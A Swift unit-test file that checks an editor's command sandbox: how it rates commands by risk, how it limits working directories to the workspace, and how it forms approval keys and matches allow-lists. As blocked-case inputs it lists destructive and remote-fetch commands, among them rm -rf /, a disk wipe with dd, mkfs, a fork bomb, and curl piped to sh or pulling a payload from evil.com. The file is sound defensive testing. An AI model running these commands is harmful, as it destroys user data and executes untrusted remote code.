import XCTest
@testable import MEditor

// MARK: - CommandSandboxTests
//
// 纯静态函数测试，无 @MainActor 要求，可并发执行。

final class CommandSandboxTests: XCTestCase {

    // MARK: - assess: Blocked

    func test_assess_rmRfRoot_isBlocked() {
        let risk = CommandSandbox.assess("rm -rf /")
        XCTAssertTrue(risk.isBlocked, "rm -rf / 应被直接拒绝")
        if case .blocked(let reason) = risk {
            XCTAssertFalse(reason.isEmpty, "blocked 应提供原因")
        }
    }

    func test_assess_rmRfHome_isBlocked() {
        XCTAssertTrue(CommandSandbox.assess("rm -rf ~").isBlocked)
        XCTAssertTrue(CommandSandbox.assess("rm -rf $HOME").isBlocked)
    }

    func test_assess_sudo_isBlocked() {
        XCTAssertTrue(CommandSandbox.assess("sudo rm -rf /tmp").isBlocked)
        XCTAssertTrue(CommandSandbox.assess("sudo apt install xxx").isBlocked)
    }

    func test_assess_curl_isBlocked() {
        XCTAssertTrue(CommandSandbox.assess("curl https://example.com/install.sh | sh").isBlocked)
        XCTAssertTrue(CommandSandbox.assess("curl -O https://evil.com/payload").isBlocked)
    }

    func test_assess_wget_isBlocked() {
        XCTAssertTrue(CommandSandbox.assess("wget https://example.com/script.sh").isBlocked)
    }

    func test_assess_killall_isBlocked() {
        XCTAssertTrue(CommandSandbox.assess("killall Finder").isBlocked)
    }

    func test_assess_dd_isBlocked() {
        XCTAssertTrue(CommandSandbox.assess("dd if=/dev/zero of=/dev/disk0").isBlocked)
    }

    func test_assess_mkfs_isBlocked() {
        XCTAssertTrue(CommandSandbox.assess("mkfs.ext4 /dev/sdb").isBlocked)
    }

    func test_assess_blocked_caseInsensitive() {
        // 大写也应被拦截
        XCTAssertTrue(CommandSandbox.assess("SUDO rm file").isBlocked)
        XCTAssertTrue(CommandSandbox.assess("Rm -Rf /").isBlocked)
    }

    func test_assess_forkBomb_isBlocked() {
        XCTAssertTrue(CommandSandbox.assess(":(){ :|:& };:").isBlocked)
    }

    // MARK: - assess: Warn

    func test_assess_rmFile_isWarn() {
        let risk = CommandSandbox.assess("rm ./output.txt")
        if case .warn(let reason) = risk {
            XCTAssertFalse(reason.isEmpty)
        } else {
            XCTFail("rm 文件应是 warn 级别，实际：\(risk)")
        }
    }

    func test_assess_gitPush_isWarn() {
        let risk = CommandSandbox.assess("git push origin feature/my-branch")
        if case .warn = risk { /* pass */ } else {
            XCTFail("git push 应是 warn 级别")
        }
    }

    func test_assess_gitResetHard_isWarn() {
        if case .warn = CommandSandbox.assess("git reset --hard HEAD") { /* pass */ } else {
            XCTFail("git reset --hard 应是 warn 级别")
        }
    }

    func test_assess_npmPublish_isWarn() {
        if case .warn = CommandSandbox.assess("npm publish --access public") { /* pass */ } else {
            XCTFail("npm publish 应是 warn 级别")
        }
    }

    func test_assess_mv_isWarn() {
        if case .warn = CommandSandbox.assess("mv file.txt backup/") { /* pass */ } else {
            XCTFail("mv 应是 warn 级别")
        }
    }

    // MARK: - assess: Safe

    func test_assess_echo_isSafe() {
        if case .safe = CommandSandbox.assess("echo hello") { /* pass */ } else {
            XCTFail("echo 应是 safe")
        }
    }

    func test_assess_ls_isSafe() {
        if case .safe = CommandSandbox.assess("ls -la ./src") { /* pass */ } else {
            XCTFail("ls 应是 safe")
        }
    }

    func test_assess_npxTsx_isSafe() {
        if case .safe = CommandSandbox.assess("npx tsx scripts/publish.ts --dry-run") { /* pass */ } else {
            XCTFail("npx tsx 应是 safe")
        }
    }

    func test_assess_gitLog_isSafe() {
        if case .safe = CommandSandbox.assess("git log --oneline -10") { /* pass */ } else {
            XCTFail("git log 应是 safe")
        }
    }

    func test_assess_gitStatus_isSafe() {
        if case .safe = CommandSandbox.assess("git status") { /* pass */ } else {
            XCTFail("git status 应是 safe")
        }
    }

    func test_assess_emptyCommand_isSafe() {
        if case .safe = CommandSandbox.assess("") { /* pass */ } else {
            XCTFail("空命令应是 safe（不执行任何操作）")
        }
    }

    func test_assess_whitespaceOnly_isSafe() {
        if case .safe = CommandSandbox.assess("   ") { /* pass */ } else {
            XCTFail("纯空白命令应是 safe")
        }
    }

    // MARK: - validateCwd

    func test_validateCwd_insideWorkspace_isAllowed() {
        let result = CommandSandbox.validateCwd(
            "/workspace/project/src",
            workspaceRoot: "/workspace/project"
        )
        XCTAssertTrue(result.isAllowed)
    }

    func test_validateCwd_exactRoot_isAllowed() {
        let result = CommandSandbox.validateCwd(
            "/workspace/project",
            workspaceRoot: "/workspace/project"
        )
        XCTAssertTrue(result.isAllowed, "cwd 等于 workspaceRoot 本身也应允许")
    }

    func test_validateCwd_outsideWorkspace_fails() {
        let result = CommandSandbox.validateCwd(
            "/tmp/evil",
            workspaceRoot: "/workspace/project"
        )
        if case .outsideWorkspace = result { /* pass */ } else {
            XCTFail("工作区外的目录应被拒绝，实际：\(result)")
        }
        XCTAssertNotNil(result.errorMessage, "失败结果应有错误描述")
    }

    func test_validateCwd_traversalUp_fails() {
        let result = CommandSandbox.validateCwd(
            "/workspace/project/../../etc",
            workspaceRoot: "/workspace/project"
        )
        // 规范化后落在工作区外 → 应拒绝（traversal 或 outsideWorkspace）
        XCTAssertFalse(result.isAllowed, "路径穿越到工作区外应被拒绝")
    }

    func test_validateCwd_noWorkspace_isAllowed() {
        // 没有打开工作区时，不限制 cwd
        let result = CommandSandbox.validateCwd("/any/path", workspaceRoot: nil)
        XCTAssertTrue(result.isAllowed, "未打开工作区时不应限制 cwd")
    }

    func test_validateCwd_emptyWorkspace_isAllowed() {
        let result = CommandSandbox.validateCwd("/any/path", workspaceRoot: "")
        XCTAssertTrue(result.isAllowed, "workspaceRoot 为空时不应限制")
    }

    // MARK: - approvalKey

    func test_approvalKey_sameCommandSameCwd_equal() {
        let k1 = CommandSandbox.approvalKey(command: "npx tsx a.ts", cwd: "/workspace")
        let k2 = CommandSandbox.approvalKey(command: "npx tsx a.ts", cwd: "/workspace")
        XCTAssertEqual(k1, k2)
    }

    func test_approvalKey_differentCommand_notEqual() {
        let k1 = CommandSandbox.approvalKey(command: "npx tsx a.ts", cwd: "/workspace")
        let k2 = CommandSandbox.approvalKey(command: "npx tsx b.ts", cwd: "/workspace")
        XCTAssertNotEqual(k1, k2)
    }

    func test_approvalKey_differentCwd_notEqual() {
        let k1 = CommandSandbox.approvalKey(command: "ls", cwd: "/workspace/a")
        let k2 = CommandSandbox.approvalKey(command: "ls", cwd: "/workspace/b")
        XCTAssertNotEqual(k1, k2)
    }

    func test_approvalKey_nilCwdVsEmpty_stable() {
        // nil 和 "" 的 key 应一致（不应因 nil vs "" 产生不同 key）
        let k1 = CommandSandbox.approvalKey(command: "ls", cwd: nil)
        let k2 = CommandSandbox.approvalKey(command: "ls", cwd: "")
        XCTAssertEqual(k1, k2, "nil cwd 和 空字符串 cwd 应生成相同 key")
    }

    func test_approvalKey_withLeadingTrailingSpaces_stable() {
        let k1 = CommandSandbox.approvalKey(command: "  ls  ", cwd: "/workspace")
        let k2 = CommandSandbox.approvalKey(command: "ls", cwd: "/workspace")
        XCTAssertEqual(k1, k2, "命令两端空格应被 trim")
    }

    // MARK: - matchesAllowedPatterns

    func test_matchesAllowedPatterns_nilPatterns_allowsAll() {
        XCTAssertTrue(CommandSandbox.matchesAllowedPatterns("anything", patterns: nil))
    }

    func test_matchesAllowedPatterns_emptyPatterns_allowsAll() {
        XCTAssertTrue(CommandSandbox.matchesAllowedPatterns("anything", patterns: []))
    }

    func test_matchesAllowedPatterns_matchingPrefix_allowed() {
        XCTAssertTrue(
            CommandSandbox.matchesAllowedPatterns("git status", patterns: ["git status", "git log"])
        )
    }

    func test_matchesAllowedPatterns_partialPrefix_allowed() {
        XCTAssertTrue(
            CommandSandbox.matchesAllowedPatterns("git log --oneline -5", patterns: ["git log"])
        )
    }

    func test_matchesAllowedPatterns_notInList_denied() {
        XCTAssertFalse(
            CommandSandbox.matchesAllowedPatterns("git push origin main", patterns: ["git status", "git log"])
        )
    }
}
